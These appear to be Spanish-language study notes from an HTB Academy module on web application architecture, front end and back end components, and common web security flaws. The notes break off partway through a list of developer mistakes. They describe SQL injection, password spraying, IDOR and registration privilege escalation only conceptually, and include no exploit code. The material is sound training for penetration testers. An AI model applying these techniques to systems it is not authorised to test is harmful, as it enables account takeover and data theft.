#HTB-Academy #Bug-Bounty-Hunter

# Introduction

---

Las [aplicaciones web](https://en.wikipedia.org/wiki/Web_application) son aplicaciones interactivas que se ejecutan en navegadores web. Las aplicaciones web suelen adoptar una [arquitectura cliente-servidor](https://cio-wiki.org/wiki/Client_Server_Architecture) para ejecutarse y gestionar las interacciones. Suelen tener componentes frontales (es decir, la interfaz del sitio web, o «lo que ve el usuario») que se ejecutan en el lado del cliente (navegador) y otros componentes back-end (código fuente de la aplicación web) que se ejecutan en el lado del servidor (servidor back-end/bases de datos).

Esto permite a las organizaciones alojar potentes aplicaciones con un control casi total en tiempo real sobre su diseño y funcionalidad, al tiempo que son accesibles en todo el mundo. Algunos ejemplos de aplicaciones web típicas son servicios de correo electrónico en línea como `Gmail`, tiendas online como `Amazon` y procesadores de texto en línea como `Google Docs`.

   

![](https://academy.hackthebox.com/storage/modules/75/htb-web-app_1.jpg)

Las aplicaciones web no son exclusivas de proveedores gigantes como Google o Microsoft, sino que pueden ser desarrolladas por cualquier desarrollador web y alojadas en línea en cualquiera de los servicios de alojamiento habituales, para ser utilizadas por cualquier persona en internet. Por eso hoy tenemos millones de aplicaciones web por todo Internet, con miles de millones de usuarios interactuando con ellas cada día.

---

## Web Applications vs. Websites

En el pasado, interactuábamos con sitios web que eran estáticos y no podían modificarse en tiempo real. Esto significa que los sitios web tradicionales se creaban estáticamente para representar una información concreta, y esta información no cambiaba con nuestra interacción. Para cambiar el contenido del sitio web, los desarrolladores tienen que editar manualmente la página correspondiente. Este tipo de páginas estáticas no contienen funciones y, por tanto, no producen cambios en tiempo real. Ese tipo de sitio web también se conoce como [Web 1.0](https://en.wikipedia.org/wiki/Web_2.0#Web_1.0).

![web sites vs web apps](https://academy.hackthebox.com/storage/modules/75/website_vs_webapps.jpg)

Por otro lado, la mayoría de los sitios web ejecutan aplicaciones web, o [Web 2.0](https://en.wikipedia.org/wiki/Web_2.0) que presentan contenidos dinámicos basados en la interacción del usuario. Otra diferencia significativa es que las aplicaciones web son totalmente funcionales y pueden realizar diversas funciones para el usuario final, mientras que los sitios web carecen de este tipo de funcionalidad. Otras diferencias clave entre los sitios web tradicionales y las aplicaciones web son:


- Ser modulares
- Funcionan en cualquier tamaño de pantalla.
- Funcionan en cualquier plataforma sin estar optimizadas.
- 
---

## Web Applications vs. Native Operating System Applications

A diferencia de las aplicaciones nativas del sistema operativo (SO), las aplicaciones web son independientes de la plataforma y pueden ejecutarse en un navegador de cualquier sistema operativo. Estas aplicaciones web no tienen que instalarse en el sistema del usuario porque estas aplicaciones web y su funcionalidad se ejecutan remotamente en el servidor remoto y, por tanto, no consumen espacio en el disco duro del usuario final.

Otra ventaja de las aplicaciones web sobre las aplicaciones nativas del sistema operativo es la unidad de versión. Todos los usuarios que acceden a una aplicación web utilizan la misma versión y la misma aplicación web, que puede actualizarse y modificarse continuamente sin necesidad de enviar actualizaciones a cada usuario. Las aplicaciones web pueden actualizarse en una única ubicación (servidor web) sin necesidad de desarrollar distintas versiones para cada plataforma, lo que reduce drásticamente los costes de mantenimiento y soporte al eliminar la necesidad de comunicar los cambios a todos los usuarios de forma individual.

Por otro lado, las aplicaciones nativas del sistema operativo tienen ciertas ventajas sobre las aplicaciones web, principalmente su velocidad de funcionamiento y la capacidad de utilizar librerías nativas del sistema operativo y hardware local. Como las aplicaciones nativas están construidas para utilizar librerías nativas del SO, son mucho más rápidas de cargar y de interactuar con ellas. Además, las aplicaciones nativas suelen ser más capaces que las aplicaciones web, ya que tienen una integración más profunda con el sistema operativo y no se limitan únicamente a las capacidades del navegador.

Más recientemente, sin embargo, las aplicaciones web híbridas y progresivas son cada vez más comunes. Utilizan marcos modernos para ejecutar aplicaciones web utilizando capacidades y recursos nativos del sistema operativo, lo que las hace más rápidas que las aplicaciones web normales y más capaces.

---

## Web Application Distribution

Existen muchas aplicaciones web de código abierto utilizadas por organizaciones de todo el mundo que pueden personalizarse para satisfacer las necesidades de cada organización. Algunas aplicaciones web de código abierto habituales son:

- [WordPress](https://wordpress.com/)
- [OpenCart](https://www.opencart.com/)
- [Joomla](https://www.joomla.org/)

También existen aplicaciones web propietarias de «código cerrado», que suelen ser desarrolladas por una organización determinada y luego vendidas a otra organización o utilizadas por organizaciones a través de un modelo de plan de suscripción. Algunas aplicaciones web de código cerrado comunes son:

- [Wix](https://www.wix.com/)
- [Shopify](https://www.shopify.com/)
- [DotNetNuke](https://www.dnnsoftware.com/)

---

## Security Risks of Web Applications

Los ataques a aplicaciones web son frecuentes y suponen un reto para la mayoría de las organizaciones con presencia en Internet, independientemente de su tamaño. Al fin y al cabo, suelen ser accesibles desde cualquier país por cualquier persona con una conexión a Internet y un navegador web y suelen ofrecer una amplia superficie de ataque. Existen muchas herramientas automatizadas para escanear y atacar aplicaciones web que, en las manos equivocadas, pueden causar daños importantes. A medida que las aplicaciones web se vuelven más complicadas y avanzadas, también aumenta la posibilidad de que se incorporen vulnerabilidades críticas en su diseño.

Un ataque exitoso a una aplicación web puede provocar pérdidas significativas e interrupciones masivas del negocio. Dado que las aplicaciones web se ejecutan en servidores que pueden albergar otra información sensible y a menudo también están vinculadas a bases de datos que contienen datos sensibles de usuarios o de la empresa, todos estos datos podrían verse comprometidos si un sitio web es atacado con éxito. Por este motivo, es fundamental que cualquier empresa que utilice aplicaciones web compruebe adecuadamente estas aplicaciones en busca de vulnerabilidades y las parchee con prontitud, al tiempo que comprueba que el parche corrige el fallo y no introduce inadvertidamente nuevos fallos.

Las pruebas de penetración de aplicaciones web son una habilidad cada vez más importante que hay que aprender. Cualquier organización que busque asegurar sus aplicaciones web orientadas a Internet (e internas) debe someterse a pruebas frecuentes de aplicaciones web e implementar prácticas de codificación segura en cada etapa del ciclo de vida de desarrollo. Para realizar correctamente pruebas pentest de aplicaciones web, debemos comprender cómo funcionan, cómo se desarrollan y qué tipo de riesgo existe en cada capa y componente de la aplicación en función de las tecnologías utilizadas.

Siempre nos encontraremos con diversas aplicaciones web que están diseñadas y configuradas de forma diferente. Uno de los métodos más actuales y utilizados para probar aplicaciones web es la [Guía OWASP de Pruebas de Seguridad Web](https://github.com/OWASP/wstg/tree/master/document/4-Web_Application_Security_Testing).

Uno de los procedimientos más comunes es empezar revisando los componentes frontales de una aplicación web, como `HTML`, `CSS` y `JavaScript` (también conocidos como la trinidad front-end), e intentar encontrar vulnerabilidades como [Exposición de datos sensibles](https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure) y [Cross-Site Scripting (XSS)](https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)). Una vez comprobados a fondo todos los componentes frontales, solemos revisar la funcionalidad básica de la aplicación web y la interacción entre el navegador y el servidor web para enumerar las tecnologías que utiliza el servidor web y buscar fallos que puedan explotarse. Normalmente evaluamos las aplicaciones web desde una perspectiva autenticada y no autenticada (si la aplicación tiene funcionalidad de inicio de sesión) para maximizar la cobertura y revisar todos los escenarios de ataque posibles.

---

## Attacking Web Applications

Hoy en día, casi todas las empresas, independientemente de su tamaño, tienen una o varias aplicaciones web en su perímetro externo. Estas aplicaciones pueden ser de todo, desde simples sitios web estáticos a blogs alimentados por Sistemas de Gestión de Contenidos (CMS) como `WordPress` a complicadas aplicaciones con funcionalidad de registro/login que soportan varios roles de usuario, desde usuarios básicos a súper administradores. Hoy en día, no es muy común encontrar un host de cara al exterior directamente explotable a través de un exploit público conocido (como un servicio vulnerable o una vulnerabilidad de ejecución remota de código (RCE) de Windows), aunque ocurre. Las aplicaciones web ofrecen una vasta superficie de ataque, y su naturaleza dinámica significa que cambian constantemente (¡y se pasan por alto!). Un cambio de código relativamente sencillo puede introducir una vulnerabilidad catastrófica o una serie de vulnerabilidades que pueden encadenarse para obtener acceso a datos confidenciales o la ejecución remota de código en el servidor web o en otros hosts del entorno, como los servidores de bases de datos.

No es infrecuente encontrar fallos que pueden conducir directamente a la ejecución de código, como un formulario de carga de archivos que permite cargar código malicioso o una vulnerabilidad de inclusión de archivos que puede aprovecharse para obtener la ejecución remota de código. Una vulnerabilidad bien conocida que sigue siendo bastante frecuente en varios tipos de aplicaciones web es la inyección SQL. Este tipo de vulnerabilidad surge de la manipulación insegura de la información suministrada por el usuario. Puede dar lugar al acceso a datos sensibles, lectura/escritura de archivos en el servidor de base de datos, e incluso la ejecución remota de código.

A menudo encontramos vulnerabilidades de inyección SQL en aplicaciones web que utilizan Active Directory para la autenticación. Aunque normalmente no podemos aprovechar esto para extraer contraseñas (ya que Active Directory las administra), a menudo podemos extraer la mayoría o todas las direcciones de correo electrónico de los usuarios de Active Directory, que a menudo coinciden con sus nombres de usuario. Estos datos se pueden utilizar para realizar un ataque de [pulverización de contraseñas](https://us-cert.cisa.gov/ncas/current-activity/2019/08/08/acsc-releases-advisory-password-spraying-attacks) contra portales web que utilizan Active Directory para la autenticación, como VPN o Microsoft Outlook Web Access/Microsoft O365. Una pulverización de contraseñas exitosa a menudo puede resultar en el acceso a datos confidenciales como el correo electrónico o incluso un punto de apoyo directamente en el entorno de red corporativo.

Este ejemplo muestra el daño que puede surgir de una sola vulnerabilidad de una aplicación web, especialmente cuando se «encadena» para extraer datos de una aplicación que pueden utilizarse para atacar otras partes de la infraestructura externa de una empresa. Un profesional de la infoseguridad bien formado debe tener un profundo conocimiento de las aplicaciones web y sentirse tan cómodo atacando aplicaciones web como realizando pruebas de penetración de red y ataques a Active Directory. Un probador de penetración con una base sólida en aplicaciones web a menudo puede diferenciarse de sus compañeros y encontrar defectos que otros pueden pasar por alto. A continuación se ofrecen algunos ejemplos más del mundo real de ataques a aplicaciones web y su impacto:

| Flaw                                                                                                                                                                                | Real-world Scenario                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [SQL injection](https://owasp.org/www-community/attacks/SQL_Injection)                                                                                                              | Obtener nombres de usuario de Active Directory y realizar un ataque de pulverización de contraseñas contra un portal VPN o de correo electrónico.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| [File Inclusion](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion) | Lectura del código fuente para encontrar una página o directorio oculto que exponga funcionalidad adicional que pueda utilizarse para obtener la ejecución remota de código.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| [Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)                                                                                | Una aplicación web que permite a un usuario subir una foto de perfil que permite subir cualquier tipo de archivo (no sólo imágenes). Esto puede aprovecharse para obtener el control total del servidor de la aplicación web cargando código malicioso.                                                                                                                                                                                                                                                                                                                                                                                                                          |
| [Insecure Direct Object Referencing (IDOR)](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html)                            | Cuando se combina con un fallo como un control de acceso roto, esto puede usarse a menudo para acceder a los archivos o funcionalidades de otro usuario. Un ejemplo sería editar tu perfil de usuario navegando a una página como /user/701/edit-profile. Si podemos cambiar el `701` a `702`, ¡podremos editar el perfil de otro usuario!                                                                                                                                                                                                                                                                                                                                       |
| [Broken Access Control](https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control)                                                                                   | Otro ejemplo es una aplicación que permite a un usuario registrar una nueva cuenta. Si la funcionalidad de registro de cuentas está mal diseñada, un usuario puede realizar una escalada de privilegios al registrarse. Consideremos la petición `POST` al registrar un nuevo usuario, que envía los datos `username=bjones&password=Welcome1&email=bjones@inlanefreight.local&roleid=3`. Qué pasaría si pudiéramos manipular el parámetro `roleid` y cambiarlo a `0` o `1`. Hemos visto aplicaciones en el mundo real donde este era el caso, y era posible registrar rápidamente un usuario administrador y acceder a muchas características no deseadas de la aplicación web. |

Empieza a familiarizarte con los ataques comunes a aplicaciones web y sus implicaciones. No te preocupes si alguno de estos términos te suena extraño en este momento; se irán aclarando a medida que avances y apliques un enfoque iterativo al aprendizaje.

Es imperativo estudiar las aplicaciones web en profundidad y familiarizarse con su funcionamiento y con muchas pilas de aplicaciones diferentes. Veremos ataques a aplicaciones web repetidamente durante nuestro viaje por la Academia, en la plataforma principal de HTB y en evaluaciones de la vida real. Vamos a sumergirnos y aprender la estructura/función de las aplicaciones web para convertirnos en atacantes mejor informados, diferenciarnos de nuestros compañeros y encontrar fallos que otros pueden pasar por alto.

# Web Application Layout

---

No hay dos aplicaciones web idénticas. Las empresas crean aplicaciones web para multitud de usos y públicos. Las aplicaciones web se diseñan y programan de forma diferente, y la infraestructura de back-end puede configurarse de muchas maneras distintas. Es importante comprender las distintas formas en que las aplicaciones web pueden ejecutarse entre bastidores, la estructura de una aplicación web, sus componentes y cómo pueden configurarse dentro de la infraestructura de una empresa.

Los diseños de las aplicaciones web constan de muchas capas diferentes que se pueden resumir con las siguientes tres categorías principales:

| **Category**                     | **Description**                                                                                                                                                                                                                                                                                     |
| -------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Web Application Infrastructure` | Describe la estructura de los componentes necesarios, como la base de datos, para que la aplicación web funcione según lo previsto. Dado que la aplicación web puede configurarse para ejecutarse en un servidor independiente, es esencial saber a qué servidor de base de datos necesita acceder. |
| `Web Application Components`     | Los componentes que conforman una aplicación web representan todos los componentes con los que interactúa la aplicación web. Se dividen en las tres áreas siguientes: Componentes `UI/UX`, `Cliente` y `Servidor`.                                                                                  |
| `Web Application Architecture`   | La arquitectura comprende todas las relaciones entre los distintos componentes de una aplicación web.                                                                                                                                                                                               |

---

## Web Application Infrastructure

Las aplicaciones web pueden utilizar muchas configuraciones de infraestructura diferentes. También se denominan `modelos`. Los más habituales pueden agruparse en los cuatro tipos siguientes:

- `Client-Server`
- `One Server`
- `Many Servers - One Database`
- `Many Servers - Many Databases`

---

#### Client-Server

Las aplicaciones web suelen adoptar el modelo `cliente-servidor`. Un servidor aloja la aplicación web en un modelo cliente-servidor y la distribuye a cualquier cliente que intente acceder a ella.

![cliente-servidor](https://academy.hackthebox.com/storage/modules/75/client-server-model.jpg)

En este modelo, las aplicaciones web tienen dos tipos de componentes, los del front-end, que suelen ser interpretados y ejecutados en el lado del cliente (navegador), y los componentes del back-end, que suelen ser compilados, interpretados y ejecutados por el servidor anfitrión.

Cuando un cliente visita la URL de la aplicación web (dirección web, es decir, https://www.acme.local), el servidor utiliza la interfaz principal de la aplicación web (`UI`). Una vez que el usuario pulsa un botón o solicita una función específica, el navegador envía una petición web HTTP al servidor, que interpreta esta petición y realiza la(s) tarea(s) necesaria(s) para completar la solicitud (es decir, registrar al usuario, añadir un artículo a la cesta de la compra, navegar a otra página, etc.). Una vez que el servidor dispone de los datos necesarios, devuelve el resultado al navegador del cliente, mostrándolo de forma legible para el ser humano.

Este sitio web con el que estamos interactuando es también una aplicación web, desarrollada y alojada por Hack The Box (servidor web), y accedemos a ella e interactuamos con ella utilizando nuestro navegador web (cliente).

Sin embargo, aunque la mayoría de las aplicaciones web utilizan una arquitectura cliente-servidor front-back end, existen muchas implementaciones de diseño.

---

#### One Server

En esta arquitectura, toda la aplicación web o incluso varias aplicaciones web y sus componentes, incluida la base de datos, se alojan en un único servidor. Aunque este diseño es sencillo y fácil de implementar, también es el más arriesgado.

![un-servidor](https://academy.hackthebox.com/storage/modules/75/one-server-arch.jpg)

Si cualquier aplicación web alojada en este servidor se ve comprometida en esta arquitectura, entonces los datos de todas las aplicaciones web se verán comprometidos. Este diseño representa un enfoque de «todos los huevos en la misma cesta», ya que si cualquiera de las aplicaciones web alojadas es vulnerable, todo el servidor web se vuelve vulnerable.

Además, si el servidor web se cae por cualquier motivo, todas las aplicaciones web alojadas quedan totalmente inaccesibles hasta que se resuelva el problema.

---

#### Many Servers - One Database

Este modelo separa la base de datos en su propio servidor de base de datos y permite que el servidor de alojamiento de las aplicaciones web acceda al servidor de base de datos para almacenar y recuperar datos. Puede considerarse como muchos-servidores-a-una-base-de-datos y un-servidor-a-una-base-de-datos, siempre que la base de datos esté separada en su propio servidor de base de datos.

![muchos-servidores-una-base-de-datos](https://academy.hackthebox.com/storage/modules/75/many-server-one-db-arch.jpg)

Este modelo puede permitir que varias aplicaciones web accedan a una única base de datos para tener acceso a los mismos datos sin sincronizar los datos entre ellas. Las aplicaciones web pueden ser réplicas de una aplicación principal (es decir, principal/reserva), o pueden ser aplicaciones web independientes que comparten datos comunes.

La principal ventaja de este modelo (desde el punto de vista de la seguridad) es la segmentación, ya que cada uno de los componentes principales de una aplicación web está ubicado y alojado por separado. En caso de que un servidor web se vea comprometido, los demás no se verán directamente afectados. Del mismo modo, si la base de datos se ve comprometida (por ejemplo, a través de una vulnerabilidad de inyección SQL), la propia aplicación web no se ve directamente afectada. Todavía hay medidas de control de acceso que deben ser implementadas después de la segmentación de activos, tales como limitar el acceso a la aplicación web sólo a los datos necesarios para funcionar según lo previsto.

---

#### Many Servers - Many Databases

Este modelo se basa en el de «muchos servidores, una base de datos». Sin embargo, dentro del servidor de base de datos, los datos de cada aplicación web se alojan en una base de datos independiente. La aplicación web sólo puede acceder a los datos privados y sólo a los datos comunes que comparten las aplicaciones web. También es posible alojar la base de datos de cada aplicación web en su propio servidor de base de datos.

![muchos-servidores-muchos-db](https://academy.hackthebox.com/storage/modules/75/many-server-many-db-arch.jpg)

Este diseño también se utiliza ampliamente para fines de redundancia, de modo que si cualquier servidor web o base de datos se desconecta, una copia de seguridad se ejecutará en su lugar para reducir el tiempo de inactividad tanto como sea posible. Aunque esto puede ser más difícil de implementar y puede requerir herramientas como [equilibradores de carga](https://en.wikipedia.org/wiki/Load_balancing_(computing)) para funcionar adecuadamente, esta arquitectura es una de las mejores opciones en términos de seguridad debido a sus medidas adecuadas de control de acceso y la segmentación adecuada de los activos.

Aparte de estos modelos, existen otros modelos de aplicaciones web como las aplicaciones web [sin servidor](https://aws.amazon.com/lambda/serverless-architectures-learn-more) o las aplicaciones web que utilizan [microservicios](https://aws.amazon.com/microservices).

---

## Web Application Components

Cada aplicación web puede tener un número diferente de componentes. No obstante, todos los componentes de los modelos mencionados anteriormente pueden desglosarse en:
1. `Client`
2. `Server`
    - Webserver
    - Web Application Logic
    - Database
3. `Services` (Microservices)
    - 3rd Party Integrations
    - Web Application Integrations
4. `Functions` (Serverless)

---

## Web Application Architecture

Los componentes de una aplicación web se dividen en tres capas diferentes (arquitectura de tres niveles).

| **Layer**            | **Description**                                                                                                                                                                                                                       |
| -------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Presentation Layer` | Consiste en componentes de proceso de interfaz de usuario que permiten la comunicación con la aplicación y el sistema. El cliente puede acceder a ellos a través del navegador web y se devuelven en forma de HTML, JavaScript y CSS. |
| `Application Layer`  | Esta capa garantiza que todas las peticiones del cliente (peticiones web) se procesen correctamente. Se comprueban diversos criterios, como la autorización, los privilegios y los datos transmitidos al cliente.                     |
| `Data Layer`         |  La capa de datos trabaja en estrecha colaboración con la capa de aplicación para determinar exactamente dónde se almacenan los datos necesarios y se puede acceder a ellos.                                                          |

Un ejemplo de arquitectura de una aplicación web podría tener este aspecto:

![imagen](https://docs.microsoft.com/en-us/dotnet/architecture/modern-web-apps-azure/media/image5-12.png) Fuente: [Microsoft Docs](https://docs.microsoft.com/en-us/dotnet/architecture/modern-web-apps-azure/common-web-application-architectures)

Además, algunos servidores web pueden ejecutar llamadas y programas del sistema operativo, como [IIS ISAPI](https://learn.microsoft.com/en-us/previous-versions/iis/6.0-sdk/ms525172(v=vs.90)) o [PHP-CGI](https://www.php.net/manual/en/install.unix.commandline.php).

---

#### Microservices

Podemos pensar en los microservicios como componentes independientes de la aplicación web, que en la mayoría de los casos están programados para una sola tarea. Por ejemplo, para una tienda online, podemos descomponer las tareas principales en los siguientes componentes:

- Registro
- Búsquedas
- Pagos
- Valoraciones
- Valoraciones

Estos componentes se comunican con el cliente y entre sí. La comunicación entre estos microservicios es `stateless`, lo que significa que la petición y la respuesta son independientes. Esto se debe a que los datos almacenados se `almacenan por separado` de los respectivos microservicios. El uso de microservicios se considera [arquitectura orientada a servicios (SOA)](https://en.wikipedia.org/wiki/Service-oriented_architecture), construida como una colección de diferentes funciones automatizadas centradas en un único objetivo empresarial. No obstante, estos microservicios dependen unos de otros.

Otro componente esencial y eficaz de los microservicios es que pueden escribirse en distintos lenguajes de programación y seguir interactuando. Los microservicios se benefician de un escalado más sencillo y un desarrollo más rápido de las aplicaciones, lo que fomenta la innovación y acelera la entrega de nuevas funciones. Algunas de las ventajas de los microservicios son

- Agilidad
- Escalado flexible
- Fácil despliegue
- Código reutilizable
- Resistencia

Este [whitepaper](https://d1.awsstatic.com/whitepapers/microservices-on-aws.pdf) de AWS ofrece una excelente visión general de la implementación de microservicios.

---

#### Serverless

Proveedores en la nube como AWS, GCP, Azure, entre otros, ofrecen arquitecturas sin servidor. Estas plataformas proporcionan marcos de aplicaciones para crear dichas aplicaciones web sin tener que preocuparse de los propios servidores. Estas aplicaciones web se ejecutan entonces en contenedores de computación sin estado (Docker, por ejemplo). Este tipo de arquitectura ofrece a una empresa la flexibilidad de crear y desplegar aplicaciones y servicios sin tener que gestionar la infraestructura; toda la gestión de los servidores la realiza el proveedor de la nube, que se libra de la necesidad de aprovisionar, escalar y mantener los servidores necesarios para ejecutar aplicaciones y bases de datos.

Puede obtener más información sobre la computación sin servidor y sus diversos casos de uso [aquí](https://aws.amazon.com/serverless).

---

## Architecture Security

Comprender la arquitectura general de las aplicaciones web y el diseño específico de cada aplicación web es importante a la hora de realizar una prueba de penetración en cualquier aplicación web. En muchos casos, la vulnerabilidad de una aplicación web individual puede no estar necesariamente causada por un error de programación, sino por un error de diseño en su arquitectura.

Por ejemplo, una aplicación web individual puede tener toda su funcionalidad central implementada de forma segura. Sin embargo, debido a la falta de medidas adecuadas de control de acceso en su diseño, es decir, el uso de [Role-Based Access Control(RBAC)](https://en.wikipedia.org/wiki/Role-based_access_control), los usuarios pueden ser capaces de acceder a algunas funciones de administración que no están destinados a ser directamente accesibles a ellos o incluso acceder a la información privada de otros usuarios sin tener los privilegios para hacerlo. Para solucionar este tipo de problemas, habría que implementar un cambio de diseño significativo, que probablemente sería costoso y llevaría mucho tiempo.

Otro ejemplo sería si no podemos encontrar la base de datos después de explotar una vulnerabilidad y obtener el control sobre el servidor back-end, lo que puede significar que la base de datos está alojada en un servidor separado. Puede que sólo encontremos parte de los datos de la base de datos, lo que puede significar que hay varias bases de datos en uso. Esta es la razón por la que la seguridad debe considerarse en cada fase del desarrollo de una aplicación web, y las pruebas de penetración deben llevarse a cabo durante todo el ciclo de vida de desarrollo de la aplicación web.

# Front End vs. Back End

---

Es posible que hayamos oído hablar de los términos (https://en.wikipedia.org/wiki/Front_end_and_back_end) «desarrollo web front end» y «desarrollo web back end», o del término «desarrollo web full stack» (https://www.w3schools.com/whatis/whatis_fullstack.asp), que se refiere tanto al desarrollo web front end como al back end. Estos términos se están convirtiendo en sinónimos de desarrollo de aplicaciones web, ya que abarcan la mayor parte del ciclo de desarrollo web. Sin embargo, estos términos son muy diferentes entre sí, ya que cada uno se refiere a un lado de la aplicación web, y cada uno funciona y se comunica en diferentes áreas.

---

## Front End

El front-end de una aplicación web contiene los componentes del usuario directamente a través de su navegador web (client-side). Estos componentes constituyen el código fuente de la página web que vemos cuando visitamos una aplicación web y suelen incluir `HTML`, `CSS` y `JavaScript`, que luego son interpretados en tiempo real por nuestros navegadores.

![front-end](https://academy.hackthebox.com/storage/modules/75/frontend-components.jpg)

Incluye todo lo que el usuario ve y con lo que interactúa, como los elementos principales de la página, como el título y el texto [HTML](https://www.w3schools.com/html/html_intro.asp), el diseño y la animación de todos los elementos [CSS](https://www.w3schools.com/css/css_intro.asp), y qué función realiza cada parte de una página [JavaScript](https://www.w3schools.com/js/js_intro.asp).

En las aplicaciones web modernas, los componentes frontales deben adaptarse a cualquier tamaño de pantalla y funcionar en cualquier navegador y dispositivo. Esto contrasta con los componentes back-end, que suelen estar escritos para una plataforma o sistema operativo concretos. Si el front-end de una aplicación web no está bien optimizado, puede hacer que toda la aplicación web sea lenta y no responda. En este caso, algunos usuarios pueden pensar que el servidor de alojamiento, o su Internet, es lento, mientras que el problema radica enteramente en el lado del cliente en el navegador del usuario. Por eso, la interfaz de una aplicación web debe estar optimizada para la mayoría de plataformas, dispositivos (incluidos los móviles) y tamaños de pantalla.

Aside from frontend code development, the following are some of the other tasks related to front end web application development:

- Visual Concept Web Design
- User Interface (UI) design
- User Experience (UX) design

There are many sites available to us to practice front end coding. One example is [this one](https://html-css-js.com/). Here we can play around with the [editor](https://htmlg.com/html-editor/), typing and formatting text and seeing the resulting `HTML`, `CSS`, and `JavaScript` being generated for us. Copy/paste this VERY simple example into the right hand side of the editor:

Code: html

```html
<p><strong>Welcome to Hack The Box Academy</strong><strong></strong></p>
<p></p>
<p><em>This is some italic text.</em></p>
<p></p>
<p><span style="color: #0000ff;">This is some blue text.</span></p>
<p></p>
<p></p>
```

Watch the simple HTML code render on the left. Play around with the formatting, headers, colors, etc., and watch the code change.
---

## Back End

El back end de una aplicación web controla todas las funcionalidades básicas de la aplicación, que se ejecutan en el servidor back end, que procesa todo lo necesario para que la aplicación web funcione correctamente. Es la parte que quizá nunca veamos o con la que nunca interactuamos directamente, pero un sitio web no es más que una colección de páginas web estáticas sin un back end.

Existen cuatro componentes principales de back end para las aplicaciones web:

| **Component**            | **Description**                                                                                                                                                                                                              |
| ------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Back end Servers`       | The hardware and operating system that hosts all other components and are usually run on operating systems like `Linux`, `Windows`, or using `Containers`                                                                    |
| `Web Servers`            | Web servers handle HTTP requests and connections. Some examples are `Apache`, `NGINX`, and `IIS`.                                                                                                                            |
| `Databases`              | Databases (`DBs`) store and retrieve the web application data. Some examples of relational databases are `MySQL`, `MSSQL`, `Oracle`, `PostgreSQL`, while examples of non-relational databases include `NoSQL` and `MongoDB`. |
| `Development Frameworks` | Development Frameworks are used to develop the core Web Application. Some well-known frameworks include `Laravel` (`PHP`), `ASP.NET` (`C#`), `Spring` (`Java`), `Django` (`Python`), and `Express` (`NodeJS JavaScript`).    |

![backend-server](https://academy.hackthebox.com/storage/modules/75/backend-server.jpg)

También es posible alojar cada componente del back-end en su propio servidor aislado, o en contenedores aislados, utilizando servicios como [Docker](https://www.docker.com/). Para mantener la separación lógica y mitigar el impacto de las vulnerabilidades, los diferentes componentes de la aplicación web, como la base de datos, pueden instalarse en un contenedor Docker, mientras que la aplicación web principal se instala en otro, aislando así cada parte de posibles vulnerabilidades que puedan afectar al otro contenedor o contenedores. También es posible separar cada uno en su servidor dedicado, lo que puede requerir más recursos y tiempo de mantenimiento. Aún así, depende del caso de negocio y del diseño/funcionalidad de la aplicación web en cuestión.

Algunas de las principales tareas que realizan los componentes del back-end son:

- Desarrollar la lógica y los servicios principales del back-end de la aplicación web.
- Desarrollar el código principal y las funcionalidades de la aplicación web
- Desarrollar y mantener la base de datos del back end
- Desarrollar e implementar las bibliotecas que utilizará la aplicación web.
- Implementación de las necesidades técnicas y empresariales de la aplicación web
- Implementar las principales [APIs](https://en.wikipedia.org/wiki/API) para las comunicaciones de los componentes front-end
- Integrar servidores remotos y servicios en la nube en la aplicación web.

---

## Securing Front/Back End

Aunque en la mayoría de los casos no tendremos acceso al código back-end para analizar las funciones individuales y la estructura del código, esto no hace que la aplicación sea invulnerable. Todavía podría ser explotada por varios ataques de inyección, por ejemplo.

Supongamos que tenemos una función de búsqueda en una aplicación web que por error no procesa correctamente nuestras consultas de búsqueda. En ese caso, podríamos utilizar técnicas específicas para manipular las consultas de tal forma que obtengamos acceso no autorizado a datos específicos de la base de datos [inyecciones SQL](https://www.w3schools.com/sql/sql_injection.asp) o incluso ejecutar comandos del sistema operativo a través de la aplicación web, también conocido como [inyecciones de comandos](https://owasp.org/www-community/attacks/Command_Injection).

Más adelante hablaremos de cómo asegurar cada componente utilizado en los extremos frontal y posterior. Cuando tenemos acceso completo al código fuente de los componentes del front-end, podemos realizar una revisión del código para encontrar vulnerabilidades, que es parte de lo que se conoce como [Whitebox Pentesting](https://en.wikipedia.org/wiki/White-box_testing).

Por otro lado, el código fuente de los componentes back-end se almacena en el servidor back-end, por lo que no tenemos acceso a él por defecto, lo que nos obliga únicamente a realizar lo que se conoce como [Blackbox Pentesting](https://en.wikipedia.org/wiki/Black-box_testing). Sin embargo, como veremos, algunas aplicaciones web son de código abierto, lo que significa que probablemente tengamos acceso a su código fuente. Además, algunas vulnerabilidades como [Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion) podrían permitirnos obtener el código fuente del servidor back-end. Con este código fuente en la mano, podemos entonces realizar una revisión de código en los componentes de back-end para entender mejor cómo funciona la aplicación, potencialmente encontrar datos sensibles en el código fuente (como contraseñas), e incluso encontrar vulnerabilidades que serían difíciles o imposibles de encontrar sin acceso al código fuente.

Los `top 20` errores más comunes que cometen los desarrolladores web y que son esenciales para nosotros como probadores de penetración son:

|**No.**|**Mistake**|
|---|---|
|`1.`|Permitting Invalid Data to Enter the Database|
|`2.`|Focusing on the System as a Whole|
|`3.`|Establishing Personally Developed Security Methods|
|`4.`|Treating Security to be Your Last Step|
|`5.`|Developing Plain Text Password Storage|
